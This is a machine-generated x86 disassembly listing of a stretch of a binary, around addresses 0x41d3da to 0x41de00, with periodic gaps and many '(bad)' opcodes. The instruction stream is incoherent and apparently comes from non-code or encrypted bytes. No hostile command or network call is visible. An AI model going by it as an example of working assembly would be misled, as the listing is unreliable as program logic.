  41d3da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3db:	stc    
  41d3dc:	and    bh,BYTE PTR [esi+0x22]
  41d3df:	xchg   ecx,eax
  41d3e0:	fcmovnu st,st(6)
  41d3e2:	and    esi,ecx
  41d3e4:	or     al,BYTE PTR [eax*8-0x317f2bc]
  41d3eb:	or     eax,ebp
  41d3ed:	jg     0x41d467
  41d3ef:	and    ch,0xf3
  41d3f2:	push   0x5f10d600
  41d3f7:	adc    ebx,DWORD PTR [ebx+0x2e38bfe6]
  41d3fd:	xchg   esi,eax
  41d3fe:	gs push edx
  41d400:	jb     0x41d38c
  41d402:	push   es
  41d403:	or     BYTE PTR [edi+esi*1+0x4c2d7733],bl
  41d40a:	loopne 0x41d478
  41d40c:	mov    eax,ds:0xc02bf98
  41d411:	call   0x6984:0x11d6d7ae
  41d418:	adc    BYTE PTR [eax+ecx*4+0x75],0x3a
  41d41d:	mov    edi,0xd5380873
  41d422:	fmul   QWORD PTR [edi-0x1f91b944]
  41d428:	mov    ah,0x5c
  41d42a:	daa    
  41d42b:	sti    
  41d42c:	mov    al,ds:0x510f7451
  41d431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d432:	or     edx,DWORD PTR [ecx]
  41d434:	pop    es
  41d435:	mov    ebp,0x84c9d9fc
  41d43a:	adc    edx,0xffffff99
  41d43d:	dec    DWORD PTR [esi-0x34]
  41d440:	cmp    edx,DWORD PTR [ebx]
  41d442:	addr16 pop es
  41d444:	inc    esi
  41d445:	aad    0x48
  41d447:	(bad)  
  41d448:	into   
  41d449:	adc    bh,BYTE PTR [eax]
  41d44b:	shr    BYTE PTR [ecx],0xce
  41d44e:	mov    BYTE PTR [esi-0xb25e3c3],al
  41d454:	add    eax,0xd3368bb4
  41d459:	gs pop esp
  41d45b:	dec    edi
  41d45c:	sbb    BYTE PTR ds:[ecx+0xfcef1fa],al
  41d463:	xor    edi,DWORD PTR [ecx-0x5a]
  41d466:	call   0xef73:0xe60ed54c
  41d46d:	leave  
  41d46e:	adc    DWORD PTR [edi-0x52],0x26068be7
  41d475:	xor    cl,BYTE PTR [edx]
  41d477:	xchg   edx,eax
  41d478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d479:	push   ebp
  41d47a:	mov    eax,0x1c3ce6f3
  41d47f:	(bad)  
  41d480:	pop    ds
  41d481:	repz inc edi
  41d483:	js     0x41d42f
  41d485:	inc    esi
  41d486:	push   edx
  41d487:	sub    dh,BYTE PTR [ecx+0x47f66270]
  41d48d:	bound  ebp,QWORD PTR [ecx+edi*8]
  41d490:	mov    eax,DWORD PTR [eax]
	...
  41d4f2:	add    BYTE PTR [eax],al
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd059:0xa1c10089
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0x92000001
  41d50d:	dec    edx
  41d50e:	jmp    0x41d492
  41d510:	add    eax,0x588b13b6
  41d515:	(bad)  
  41d516:	dec    edx
  41d517:	push   esi
  41d518:	jg     0x41d4d8
  41d51a:	xchg   ebp,eax
  41d51b:	clc    
  41d51c:	jge    0x41d51b
  41d51e:	and    DWORD PTR [edi+0x3b42791a],eax
  41d524:	dec    eax
  41d525:	adc    dh,BYTE PTR [eax-0x34881208]
  41d52b:	sbb    al,0x42
  41d52d:	xor    DWORD PTR [ebp+0x26],ecx
  41d530:	sub    ebx,ebp
  41d532:	or     DWORD PTR [ecx],edx
  41d534:	ds repnz push edi
  41d537:	and    BYTE PTR [edi*2+0x330c5b45],cl
  41d53e:	xor    eax,0x56804406
  41d543:	cdq    
  41d544:	and    dl,BYTE PTR [edi+0x65]
  41d547:	in     eax,dx
  41d548:	xchg   ebp,eax
  41d549:	imul   esi,DWORD PTR es:0xaa7ada38,0xe8060940
  41d554:	mov    edx,0x53b505fb
  41d559:	lods   eax,DWORD PTR ds:[esi]
  41d55a:	cli    
  41d55b:	mov    ds:0xf4ccfe3c,al
  41d560:	bound  edx,QWORD PTR [edx+0x34]
  41d563:	xchg   DWORD PTR [eax-0x77],eax
  41d566:	push   edx
  41d567:	sbb    DWORD PTR [ebp+0xa],edx
  41d56a:	pop    fs
  41d56c:	sub    eax,0xa88c814e
  41d571:	setge  BYTE PTR [esi-0x57f6e257]
  41d578:	int3   
  41d579:	xchg   ebx,eax
  41d57a:	jae    0x41d5b1
  41d57c:	sub    ebx,DWORD PTR [eax]
  41d57e:	shl    ebp,1
  41d580:	and    al,0xb
  41d582:	sub    BYTE PTR [ebx+0x75],al
  41d585:	dec    eax
  41d586:	jnp    0x41d554
  41d588:	mov    ebp,0xf54f8e43
  41d58d:	push   ebp
  41d58e:	xchg   esi,eax
  41d58f:	ss sbb al,0xa
  41d592:	mov    edi,0xef56e98a
  41d597:	jmp    0x9d374c14
  41d59c:	dec    esi
  41d59d:	enter  0x1e31,0xd0
  41d5a1:	push   0xffffffc4
  41d5a3:	int    0x37
  41d5a5:	std    
  41d5a6:	cmc    
  41d5a7:	test   esp,eax
  41d5a9:	in     eax,dx
  41d5aa:	out    dx,al
  41d5ab:	pop    ebx
  41d5ac:	and    al,0x1b
  41d5ae:	test   DWORD PTR [ebp+0x5ad4bd70],ecx
  41d5b4:	stos   BYTE PTR es:[edi],al
  41d5b5:	and    eax,0xa8052080
  41d5ba:	mov    BYTE PTR [esp+esi*2-0x4a],bl
  41d5be:	sbb    al,0x43
  41d5c0:	jae    0x41d558
  41d5c2:	stos   BYTE PTR es:[edi],al
  41d5c3:	test   eax,0x756aa6fa
  41d5c8:	xlat   BYTE PTR ds:[ebx]
  41d5c9:	in     al,0x5c
  41d5cb:	adc    ch,BYTE PTR [edx+0x3d]
  41d5ce:	dec    edi
  41d5cf:	rcr    DWORD PTR [edx+ecx*2+0x60],1
  41d5d3:	retf   
  41d5d4:	test   eax,0xe5e23334
  41d5d9:	dec    edx
  41d5da:	mov    esi,0xfe4d01d1
  41d5df:	cld    
  41d5e0:	cdq    
  41d5e1:	in     eax,dx
  41d5e2:	mov    ecx,0x1dee217
  41d5e7:	cli    
  41d5e8:	out    dx,eax
  41d5e9:	aam    0xa7
  41d5eb:	in     al,0xd1
  41d5ed:	xlat   BYTE PTR ds:[ebx]
  41d5ee:	and    ch,BYTE PTR [edx+ebx*8-0x57299645]
  41d5f5:	mov    WORD PTR [ebx+0x44],?
  41d5f8:	dec    edi
  41d5f9:	or     eax,eax
  41d5fb:	sbb    BYTE PTR [esp+esi*2+0x42f713ce],ch
  41d602:	adc    BYTE PTR [edi-0x2ff5ea66],bl
  41d608:	outs   dx,DWORD PTR ds:[esi]
  41d609:	nop
  41d60a:	fwait
  41d60b:	lods   eax,DWORD PTR ds:[esi]
  41d60c:	jle    0x41d5cb
  41d60e:	xchg   ebp,eax
  41d60f:	fild   QWORD PTR [eax+eax*1+0x0]
	...
  41d672:	add    BYTE PTR [eax],al
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x9f66e435
  41d681:	pusha  
  41d682:	retf   
  41d683:	hlt    
  41d684:	aad    0x38
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    eax,0xd6000001
  41d68d:	xchg   DWORD PTR [edi],ebx
  41d68f:	es xchg edi,eax
  41d691:	xchg   esp,eax
  41d692:	xor    eax,esi
  41d694:	pop    ebx
  41d695:	test   DWORD PTR [edi-0x62b1deb9],0x96de8177
  41d69f:	stc    
  41d6a0:	pusha  
  41d6a1:	add    ah,BYTE PTR [edx+0x3fa022b9]
  41d6a7:	mov    esi,DWORD PTR [eax+ebp*1]
  41d6aa:	arpl   WORD PTR [ebx-0x706e01b5],ax
  41d6b0:	mov    esp,0x58a76802
  41d6b5:	pop    esp
  41d6b6:	je     0x41d65b
  41d6b8:	xor    BYTE PTR [eax],0xd
  41d6bb:	stc    
  41d6bc:	mov    fs,esi
  41d6be:	outs   dx,BYTE PTR ds:[esi]
  41d6bf:	mov    ecx,0x890c1d03
  41d6c4:	mov    cl,0x79
  41d6c6:	add    eax,0x3a1ca9cb
  41d6cb:	fst    DWORD PTR [esi-0x3939dcf8]
  41d6d1:	leave  
  41d6d2:	pop    eax
  41d6d3:	sub    ch,cl
  41d6d5:	add    BYTE PTR [eax],0xb0
  41d6d8:	sub    dh,BYTE PTR [ebx-0x13aa3cd]
  41d6de:	sub    BYTE PTR [esi-0x4ab08369],dl
  41d6e4:	je     0x41d727
  41d6e6:	add    dh,BYTE PTR [esi-0x11]
  41d6e9:	mov    ah,0xb5
  41d6eb:	fsubr  DWORD PTR [ebx+0x6a30fe03]
  41d6f1:	imul   ecx,DWORD PTR [eax+ecx*2],0x9e70269b
  41d6f8:	aam    0xfe
  41d6fa:	mov    edi,0xd3fa6247
  41d6ff:	sbb    DWORD PTR [esi+0x44],esi
  41d702:	jge    0x41d6cd
  41d704:	rdtsc  
  41d706:	fild   QWORD PTR [ecx+0x58]
  41d709:	xchg   edi,eax
  41d70a:	mov    bh,0x2f
  41d70c:	or     al,0x8
  41d70e:	mov    al,es:0x3451a096
  41d714:	hlt    
  41d715:	shl    BYTE PTR [ebx],cl
  41d717:	cmc    
  41d718:	aaa    
  41d719:	inc    ebx
  41d71a:	inc    ebp
  41d71b:	retf   0x5a80
  41d71e:	adc    BYTE PTR [ecx+0x20],0xa8
  41d722:	rcl    DWORD PTR [eax+0x6f],cl
  41d725:	cmp    ebp,DWORD PTR [ecx+0x626bd1a8]
  41d72b:	sahf   
  41d72c:	stos   DWORD PTR es:[edi],eax
  41d72d:	jg     0x41d76f
  41d72f:	add    esp,DWORD PTR [ebp+0x6fcada1a]
  41d735:	push   ds
  41d736:	push   ds
  41d737:	xor    BYTE PTR [ebx+ebp*4],dh
  41d73a:	in     eax,dx
  41d73b:	mov    DWORD PTR [esi+esi*8],ebp
  41d73e:	div    DWORD PTR [edi+0x19]
  41d741:	jns    0x41d6eb
  41d743:	xor    BYTE PTR [ebp-0x42143aa6],al
  41d749:	pop    eax
  41d74a:	in     al,0x3e
  41d74c:	(bad)  
  41d74d:	rcl    ecx,0xb1
  41d750:	es out 0xff,al
  41d753:	ret    0x14eb
  41d756:	cdq    
  41d757:	outs   dx,BYTE PTR ds:[esi]
  41d758:	sub    DWORD PTR [edx+0x1f8353b4],0x3b
  41d75f:	mov    ebp,0x695cc806
  41d764:	leave  
  41d765:	and    eax,0xebee576d
  41d76a:	or     al,0xa5
  41d76c:	jl     0x41d730
  41d76e:	daa    
  41d76f:	mov    dl,0x48
  41d771:	aas    
  41d772:	loope  0x41d720
  41d774:	jae    0x41d6ff
  41d776:	sahf   
  41d777:	xchg   edi,eax
  41d778:	inc    ebx
  41d779:	mov    eax,ebp
  41d77b:	push   edx
  41d77c:	(bad)  
  41d77d:	iret   
  41d77e:	sub    eax,0x60b98d67
  41d783:	pop    ss
  41d784:	mov    bl,0x80
  41d786:	inc    esi
  41d787:	lahf   
  41d788:	mov    ds:0xf48d91f4,eax
  41d78d:	js     0x41d72f
  41d78f:	retf   
  41d790:	rol    DWORD PTR [eax],cl
	...
  41d7f2:	add    BYTE PTR [eax],al
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	out    dx,eax
  41d801:	mul    DWORD PTR [ecx+0x139dad3]
  41d807:	add    BYTE PTR ds:0x97000001,al
  41d80d:	cmp    esp,ebx
  41d80f:	or     bh,bh
  41d811:	retf   
  41d812:	push   edi
  41d813:	xchg   edi,eax
  41d814:	sub    bh,BYTE PTR ds:[esi+0x65]
  41d818:	push   ebp
  41d819:	push   ecx
  41d81a:	jnp    0x41d7aa
  41d81c:	out    0x3e,eax
  41d81e:	adc    DWORD PTR [eax+eiz*1+0x69],ecx
  41d822:	inc    esp
  41d823:	mov    dl,0x93
  41d825:	adc    BYTE PTR [esi-0x5],0xb1
  41d829:	push   ebx
  41d82a:	and    esp,eax
  41d82c:	jne    0x41d802
  41d82e:	push   cs
  41d82f:	mov    DWORD PTR [edi],ecx
  41d831:	aad    0xf4
  41d833:	imul   eax,DWORD PTR [eax+0x1],0x78
  41d837:	push   ds
  41d838:	add    eax,0xe8bf2360
  41d83d:	jnp    0x41d89e
  41d83f:	sbb    edi,DWORD PTR [edx-0x2747ae6f]
  41d845:	stc    
  41d846:	ja     0x41d821
  41d848:	push   0x2219156c
  41d84d:	les    ebp,FWORD PTR [esi+0x1e]
  41d850:	pop    eax
  41d851:	mov    al,0x82
  41d853:	sub    edx,esi
  41d855:	cmp    al,0x1
  41d857:	(bad)  
  41d858:	mov    ebp,0x31705568
  41d85d:	fist   DWORD PTR [ecx+0x6a]
  41d860:	mov    DWORD PTR [edx],esp
  41d862:	jno    0x41d82d
  41d864:	fiadd  DWORD PTR [eax-0x48]
  41d867:	out    0x94,eax
  41d869:	mov    bh,0xe2
  41d86b:	mov    dl,0x8
  41d86d:	int3   
  41d86e:	mov    ds:0x96f65413,eax
  41d873:	mov    edx,0x96128a59
  41d878:	and    DWORD PTR [ebx+0x68e3940d],ebp
  41d87e:	xchg   esp,eax
  41d87f:	xchg   esi,eax
  41d880:	ret    0xf53d
  41d883:	ror    BYTE PTR [ebp-0x22],0x4c
  41d887:	or     esp,DWORD PTR [ebx-0xd]
  41d88a:	add    al,0x42
  41d88c:	mov    dh,0x91
  41d88e:	xchg   ah,al
  41d890:	add    eax,0x2ecca0e9
  41d895:	jne    0x41d81c
  41d897:	sbb    eax,0x71a665a6
  41d89c:	(bad)  
  41d89d:	adc    DWORD PTR [eax+0x47],0xea3683d5
  41d8a4:	adc    BYTE PTR [eax-0x867a711],dl
  41d8aa:	sti    
  41d8ab:	stc    
  41d8ac:	sar    DWORD PTR [ebx-0x51],0x26
  41d8b0:	pop    esp
  41d8b1:	mov    ebx,0xf1d968c9
  41d8b6:	inc    ebx
  41d8b7:	daa    
  41d8b8:	shl    DWORD PTR [ebx+0x53125f23],0xbf
  41d8bf:	inc    ebp
  41d8c0:	clc    
  41d8c1:	fisubr WORD PTR [esi]
  41d8c3:	int3   
  41d8c4:	dec    ebx
  41d8c5:	add    ch,cl
  41d8c7:	mov    ds:0x6b37efc0,al
  41d8cc:	xchg   BYTE PTR [ecx+0x4666ee3a],bl
  41d8d2:	gs mov ecx,0xe38eedf3
  41d8d8:	pop    ecx
  41d8d9:	mov    WORD PTR [ebp+0x3b],ds
  41d8dc:	mov    ebx,0x2e24259a
  41d8e1:	adc    DWORD PTR [edi-0x472737d6],esp
  41d8e7:	scas   eax,DWORD PTR es:[edi]
  41d8e8:	ficomp DWORD PTR [ecx+esi*4-0x35]
  41d8ec:	popa   
  41d8ed:	inc    edx
  41d8ee:	outs   dx,DWORD PTR ds:[esi]
  41d8ef:	sbb    al,0xf5
  41d8f1:	lods   eax,DWORD PTR ds:[esi]
  41d8f2:	or     dl,BYTE PTR [eax]
  41d8f4:	xor    al,0x94
  41d8f6:	dec    edx
  41d8f7:	jb     0x41d93f
  41d8f9:	sbb    eax,0xa134cb68
  41d8fe:	xchg   edx,eax
  41d8ff:	mov    ah,0xd9
  41d901:	dec    ecx
  41d902:	arpl   WORD PTR [edi],bp
  41d904:	enter  0x2397,0xcc
  41d908:	mov    esp,fs
  41d90a:	nop
  41d90b:	dec    ecx
  41d90c:	sbb    eax,0x768b0930
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs xchg edi,eax
  41d981:	push   cs
  41d982:	sub    bl,BYTE PTR [ebx-0x21]
  41d985:	cmp    al,BYTE PTR [ecx]
  41d987:	add    BYTE PTR ds:0x5f000001,al
  41d98d:	xchg   esp,eax
  41d98e:	out    dx,eax
  41d98f:	or     al,0xeb
  41d991:	shr    BYTE PTR [ecx],0x83
  41d994:	inc    ecx
  41d995:	cdq    
  41d996:	sub    al,BYTE PTR [eax+0x46]
  41d999:	psubq  mm4,mm6
  41d99c:	or     eax,0xd0c3f8d1
  41d9a1:	out    dx,eax
  41d9a2:	loopne 0x41d9fd
  41d9a4:	mov    ds:0x10e3ae18,al
  41d9a9:	inc    edi
  41d9aa:	dec    esp
  41d9ab:	out    0x5b,al
  41d9ad:	icebp  
  41d9ae:	adc    eax,0x6efcc36d
  41d9b3:	test   BYTE PTR gs:[edi-0x47],dh
  41d9b7:	addr16 cli 
  41d9b9:	loop   0x41da24
  41d9bb:	leave  
  41d9bc:	sbb    DWORD PTR [esp+ecx*8],edi
  41d9bf:	jne    0x41d9e6
  41d9c1:	aad    0xfb
  41d9c3:	stc    
  41d9c4:	out    0x94,al
  41d9c6:	test   BYTE PTR [edi+esi*2-0x7295ba5c],bh
  41d9cd:	push   0x7c250df7
  41d9d2:	mov    cl,0x3
  41d9d4:	aam    0x46
  41d9d6:	mov    edx,0x635c984b
  41d9db:	test   BYTE PTR [ebx],ah
  41d9dd:	jnp    0x41d99d
  41d9df:	add    al,0x44
  41d9e1:	pushf  
  41d9e2:	jnp    0x41da20
  41d9e4:	mov    dh,0x8f
  41d9e6:	popf   
  41d9e7:	in     al,dx
  41d9e8:	rcl    DWORD PTR [esi+eax*8+0xe4f6b4f],0x8a
  41d9f0:	push   0xc16f4c62
  41d9f5:	mov    eax,cs:0xeeb2242d
  41d9fb:	mov    DWORD PTR [edx+0xe],ebp
  41d9fe:	fisttp WORD PTR [ebx]
  41da00:	fwait
  41da01:	and    BYTE PTR [ecx],bh
  41da03:	jg     0x41d9a0
  41da05:	mov    edi,0xf0997d8f
  41da0a:	sub    ebp,DWORD PTR [ecx]
  41da0c:	lahf   
  41da0d:	mov    ds:0xfdffbe00,eax
  41da12:	rol    dl,cl
  41da14:	mov    esi,0xc209810
  41da19:	(bad)  
  41da1a:	out    dx,eax
  41da1b:	jne    0x41da90
  41da1d:	add    dh,BYTE PTR [esi-0x6f]
  41da20:	dec    edx
  41da21:	push   ebx
  41da22:	mov    esp,0x7f034ecf
  41da27:	cmp    DWORD PTR [ecx+edi*4+0x38],0x70dc52e8
  41da2f:	mov    ch,0x99
  41da31:	rcl    BYTE PTR [edi-0x8fdb1f3],cl
  41da37:	jp     0x41d9e1
  41da39:	push   ds
  41da3a:	iret   
  41da3b:	retf   
  41da3c:	stos   DWORD PTR es:[edi],eax
  41da3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da3e:	mov    dh,0x85
  41da40:	cdq    
  41da41:	pop    ebx
  41da42:	or     DWORD PTR [edx+0x3a79ff1e],ecx
  41da48:	inc    ebx
  41da49:	popa   
  41da4a:	cdq    
  41da4b:	sahf   
  41da4c:	test   eax,0xcc5e0243
  41da51:	adc    eax,0x7d6ca491
  41da56:	jecxz  0x41d9ef
  41da58:	ret    0xefb4
  41da5b:	je     0x41daaf
  41da5d:	stos   BYTE PTR es:[edi],al
  41da5e:	fadd   QWORD PTR [edi+0x3d43b84e]
  41da64:	lods   eax,DWORD PTR ds:[esi]
  41da65:	retf   
  41da66:	and    BYTE PTR [ebx],0x12
  41da69:	addr16 jmp 0xe499:0x99b5c8f6
  41da71:	clc    
  41da72:	test   ebp,eax
  41da74:	(bad)  
  41da75:	jle    0x41daae
  41da77:	dec    esi
  41da78:	mov    ah,BYTE PTR gs:[ecx]
  41da7b:	adc    eax,0x44fbaa51
  41da80:	jg     0x41dafc
  41da82:	cld    
  41da83:	(bad)  
  41da84:	jno    0x41da9e
  41da86:	sbb    al,0xc9
  41da88:	fisubr WORD PTR [esi-0x44]
  41da8b:	or     BYTE PTR [ecx+0x2d],al
  41da8e:	xor    esi,DWORD PTR gs:[edi]
	...
  41daf1:	add    BYTE PTR [eax],al
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffffbc
  41db01:	imul   eax,edx,0x4b
  41db04:	in     al,0x3b
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0xf5000001
  41db0d:	mov    DWORD PTR [esi+0x55],edi
  41db10:	sub    DWORD PTR [eax-0x6b],edx
  41db13:	push   edi
  41db14:	push   esi
  41db15:	sti    
  41db16:	sti    
  41db17:	dec    edx
  41db18:	fcmovbe st,st(2)
  41db1a:	popf   
  41db1b:	daa    
  41db1c:	xchg   edx,eax
  41db1d:	mov    esi,0xbd3c1fa8
  41db22:	mov    bh,0x71
  41db24:	scas   al,BYTE PTR es:[edi]
  41db25:	sbb    DWORD PTR [edi],ecx
  41db27:	xor    dl,BYTE PTR [eax+0x10]
  41db2a:	hlt    
  41db2b:	cmp    DWORD PTR [eax+0x3a6d9c17],edx
  41db31:	pusha  
  41db32:	sbb    DWORD PTR [eax-0x8],edi
  41db35:	int    0xea
  41db37:	pop    edx
  41db38:	lahf   
  41db39:	push   ds
  41db3a:	sub    eax,0xde45852e
  41db3f:	ret    0x768
  41db42:	stc    
  41db43:	into   
  41db44:	dec    ecx
  41db45:	in     al,dx
  41db46:	mov    esi,0xd964cd0f
  41db4b:	sub    edi,DWORD PTR [ebx]
  41db4d:	cmp    eax,0xd59dd6aa
  41db52:	add    BYTE PTR [ecx],bl
  41db54:	add    ecx,edx
  41db56:	std    
  41db57:	lock sbb dh,0xb5
  41db5b:	mov    ebx,0xbd5f7ff9
  41db60:	inc    ebx
  41db61:	pop    ecx
  41db62:	out    dx,al
  41db63:	dec    edi
  41db64:	jp     0x41db4d
  41db66:	neg    edx
  41db68:	stos   DWORD PTR es:[edi],eax
  41db69:	pop    dx
  41db6b:	pop    edx
  41db6c:	dec    ebp
  41db6d:	sbb    DWORD PTR [edx],esi
  41db6f:	cmp    edx,DWORD PTR [ecx+ecx*8+0x1c2b4a84]
  41db76:	xchg   edx,eax
  41db77:	out    dx,eax
  41db78:	inc    edx
  41db79:	arpl   bp,cx
  41db7b:	mov    ds:0x2700a2c9,al
  41db80:	push   ebx
  41db81:	xchg   esp,eax
  41db82:	addr16 and bh,dl
  41db85:	jg     0x41dbf6
  41db87:	adc    DWORD PTR [ebx],ebx
  41db89:	dec    esi
  41db8a:	sahf   
  41db8b:	ret    0x99ca
  41db8e:	aad    0x4b
  41db90:	mov    ecx,0x8392db7b
  41db95:	out    0x53,eax
  41db97:	or     al,0x1c
  41db99:	and    BYTE PTR [esi-0x4163c7b7],dl
  41db9f:	xchg   BYTE PTR [edi+0x68],bh
  41dba2:	push   ss
  41dba3:	adc    eax,0xb5b572ae
  41dba8:	sar    DWORD PTR [eax+eax*2-0x2665bac0],1
  41dbaf:	lock xchg BYTE PTR [edx],dl
  41dbb2:	push   ecx
  41dbb3:	icebp  
  41dbb4:	pop    esp
  41dbb5:	fistp  WORD PTR [eax+0x38]
  41dbb8:	sub    BYTE PTR [edi+0x3afba912],ch
  41dbbe:	push   ss
  41dbbf:	pop    eax
  41dbc0:	(bad)  
  41dbc1:	dec    ebx
  41dbc2:	mov    ecx,0x98af0070
  41dbc7:	adc    eax,0xbb74fb05
  41dbcc:	cdq    
  41dbcd:	mov    edx,0xb07c6113
  41dbd2:	outs   dx,DWORD PTR ds:[esi]
  41dbd3:	enter  0x5e8e,0x97
  41dbd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbd8:	mov    dh,0x56
  41dbda:	xchg   edx,eax
  41dbdb:	loop   0x41dc1c
  41dbdd:	jns    0x41db9f
  41dbdf:	add    esp,ecx
  41dbe1:	ds cmp eax,0x36dfdf7b
  41dbe7:	cmp    esi,edi
  41dbe9:	pop    ecx
  41dbea:	test   dh,bh
  41dbec:	sahf   
  41dbed:	cmp    eax,0x4f389914
  41dbf2:	lods   eax,DWORD PTR ds:[esi]
  41dbf3:	adc    DWORD PTR [ebp+0x1b],ebx
  41dbf6:	add    DWORD PTR [ebx],0x1c93534b
  41dbfc:	xchg   DWORD PTR [ebx+0x51ec3725],ecx
  41dc02:	cmp    ch,BYTE PTR [edi+ecx*8]
  41dc05:	jno    0x41db9e
  41dc07:	cmp    eax,0xe7b5cd81
  41dc0c:	adc    DWORD PTR [edx-0x72],esi
  41dc0f:	push   0xffffffb1
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi+0x75b0d050]
  41dc81:	out    0xe3,al
  41dc83:	push   ds
  41dc84:	jmp    0x541ddc5
  41dc89:	add    DWORD PTR [eax],eax
  41dc8b:	add    BYTE PTR [ebx+0x17],dl
  41dc8e:	dec    edx
  41dc8f:	test   al,0x60
  41dc91:	and    ebx,esi
  41dc93:	jge    0x41dce2
  41dc95:	leave  
  41dc96:	jo     0x41dccf
  41dc98:	fiadd  WORD PTR [ebx+0x53]
  41dc9b:	daa    
  41dc9c:	mov    esi,0xd3e0a0ea
  41dca1:	or     al,0xfa
  41dca3:	div    DWORD PTR [edx+0x3a18fd94]
  41dca9:	lods   eax,DWORD PTR ds:[esi]
  41dcaa:	jmp    0x41dd20
  41dcac:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41dcae:	cmp    bh,BYTE PTR [ebx-0x45]
  41dcb1:	call   0x4510f83b
  41dcb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcb7:	jb     0x41dc39
  41dcb9:	add    DWORD PTR [ebx+0x22],0xbef46b52
  41dcc0:	xor    al,BYTE PTR [esi+0x6f]
  41dcc3:	pop    esp
  41dcc4:	pop    bx
  41dcc6:	(bad)  
  41dcc7:	jnp    0x41dc66
  41dcc9:	add    BYTE PTR [eax],ah
  41dccb:	in     eax,0x2c
  41dccd:	pushf  
  41dcce:	pop    ecx
  41dccf:	enter  0x8bd7,0x5a
  41dcd3:	scas   eax,DWORD PTR es:[edi]
  41dcd4:	out    dx,al
  41dcd5:	add    DWORD PTR [edx-0x2],ecx
  41dcd8:	add    bh,BYTE PTR [edx]
  41dcda:	jnp    0x41dcae
  41dcdc:	lahf   
  41dcdd:	mov    esp,cs
  41dcdf:	dec    esp
  41dce0:	aad    0xc4
  41dce2:	repz xchg ecx,eax
  41dce4:	add    bh,BYTE PTR [edx+0x49]
  41dce7:	test   al,0xdd
  41dce9:	pop    ss
  41dcea:	call   0x5de9:0x28897064
  41dcf1:	add    bl,BYTE PTR [edi]
  41dcf3:	xchg   esi,eax
  41dcf4:	mov    bl,ah
  41dcf6:	ins    DWORD PTR es:[edi],dx
  41dcf7:	jne    0x41dcc9
  41dcf9:	mov    bl,0x26
  41dcfb:	adc    DWORD PTR [esi+0x54],0xffffffe5
  41dcff:	into   
  41dd00:	sar    BYTE PTR [ebp-0x74],cl
  41dd03:	hlt    
  41dd04:	mov    edx,0x958b5de3
  41dd09:	adc    DWORD PTR gs:[ebp+0x59fad519],ecx
  41dd10:	push   es
  41dd11:	push   esi
  41dd12:	ret    0x365f
  41dd15:	arpl   ax,sp
  41dd17:	xchg   esp,ebx
  41dd19:	xchg   esp,eax
  41dd1a:	sbb    BYTE PTR ss:[edi+0x7f],bh
  41dd1e:	scas   eax,DWORD PTR es:[edi]
  41dd1f:	sbb    dh,ch
  41dd21:	mov    edi,0x958cdc07
  41dd26:	pop    edx
  41dd27:	aam    0xba
  41dd29:	sar    edx,0x37
  41dd2c:	int3   
  41dd2d:	adc    DWORD PTR [ebx-0x1d],edx
  41dd30:	xor    eax,0xffbd44f3
  41dd35:	ret    0x14c8
  41dd38:	stos   DWORD PTR es:[edi],eax
  41dd39:	inc    ebx
  41dd3a:	int    0x3a
  41dd3c:	jmp    0x41dd4f
  41dd3e:	into   
  41dd3f:	push   ebx
  41dd40:	jbe    0x41dd29
  41dd42:	mov    esi,0xb5933863
  41dd47:	or     ecx,DWORD PTR ds:0x184d3508
  41dd4d:	or     esi,DWORD PTR [esi+0x7ac51f86]
  41dd53:	das    
  41dd54:	inc    esp
  41dd55:	xchg   DWORD PTR [ecx+eiz*2+0x71],esi
  41dd59:	xor    DWORD PTR [ebx-0x28],esp
  41dd5c:	ret    
  41dd5d:	cmp    BYTE PTR [eax-0x3c],ah
  41dd60:	(bad)  
  41dd61:	lahf   
  41dd62:	mov    ecx,0xa0266dfb
  41dd67:	call   0x626abc53
  41dd6c:	and    BYTE PTR [ebp+eax*1-0x5f6664ab],ah
  41dd73:	jecxz  0x41dd50
  41dd75:	lock pop ds
  41dd77:	cmp    ecx,DWORD PTR [ecx]
  41dd79:	repz mov ?,WORD PTR [esi+0x31e4652f]
  41dd80:	push   eax
  41dd81:	icebp  
  41dd82:	sbb    al,0x58
  41dd84:	adc    al,0x41
  41dd86:	mov    bl,0xda
  41dd88:	mov    al,ds:0x57d9744b
  41dd8d:	sbb    DWORD PTR [edi],ecx
  41dd8f:	inc    esi
  41dd90:	sbb    al,BYTE PTR [eax]
	...
  41ddf2:	add    BYTE PTR [eax],al
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	loope  0x41ddd1
